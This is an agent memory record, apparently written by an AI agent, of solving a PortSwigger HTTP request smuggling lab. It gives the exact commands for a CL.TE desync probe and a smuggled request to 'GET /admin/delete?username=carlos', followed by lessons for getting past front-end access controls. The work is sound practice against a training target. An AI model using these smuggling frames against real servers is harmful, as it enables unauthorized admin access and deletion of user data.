---
metadata:
  node_type: memory
name: "Request Smuggling CL.TE Front-End Bypass lab record"
description: "Arm A CL.TE front-end-bypass lab solved: per-request-close front-end, stall-proved CL.TE, blind smuggled GET /admin/delete?username=carlos (deficit 0 via smuggle_seq) flipped the banner to solved."
last_updated: 2026-10-09T14:58:13+08:00
created: 2026-10-09T14:58:13+08:00
---

Arm A run, solved. Target: PortSwigger academy /web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te (title: "Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability"). Instance launched by `range_launch launch-url <path> --jar /tmp/cj1.json`; goal per page_read: smuggle a back-end request that reaches /admin and deletes carlos.

Recon evidence:
- Direct `http_session get /admin` gave 403 `"Path /admin is blocked"` - front-end control confirmed (path blocked, not host).
- `conn_reuse <url> --send-str 'GET / HTTP/1.1...' --send-str 'GET / HTTP/1.1...' --sequential` returned only ONE response, carrying `Connection: close`; same with pipelined back-to-back writes. This front-end answers one request per client connection and closes, so a second request on the same client socket is unusable (the classic send-in-sequence-on-one-connection shape is not available here).
- Desync proof (CL front-end / TE back-end): `conn_reuse <url> --send-str 'POST / HTTP/1.1\r\nHost: <lab>\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1c\r\nX' --read-ms 8000` returned zero bytes with elapsed_ms 9100 (back-end waited forever for the missing 0x1c-byte chunk body). That stall is the clean CL.TE primitive proof on this instance.

Solve:
`smuggle_seq https://<lab>/ --smuggle 'GET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\n\r\n' --follow 'GET / HTTP/1.1\r\nHost: <lab>\r\nConnection: close\r\n\r\n' --deficits 0 --read-ms 2500`
Outer frame actually sent: `POST / HTTP/1.1` + `Host: <lab>` + `Content-Length: 68` + `Transfer-Encoding: chunked`, body = `0\r\n\r\n` + smuggled request; the smuggled request is complete (deficit 0), runs entirely on the back-end (Host: localhost is the back-end-side identity), and the delete is a plain GET - no CSRF needed.
Verdict: the follow-up response contained `academyLabBanner is-solved`; `banner_verdict` then returned solved:true with congrats_line `<h4>Congratulations, you solved the lab!</h4>`.

Lessons:
- When the front-end closes per request, arm the CL.TE frame on connection A and trigger on connection B - smuggle_seq is the piece for this family; do not expect the smuggled response to come back (follow-ups landed on fresh back-end connections; smuggled GET /admin reads never surfaced).
- Blind side effects still count: the smuggled delete needs no readable response, so a dead read channel is not a blocker.
- Environment quirk: `http_dump <full-url>` failed with "Bad URL: RelativeUrlWithoutBase"; `http_session get <url>` worked.

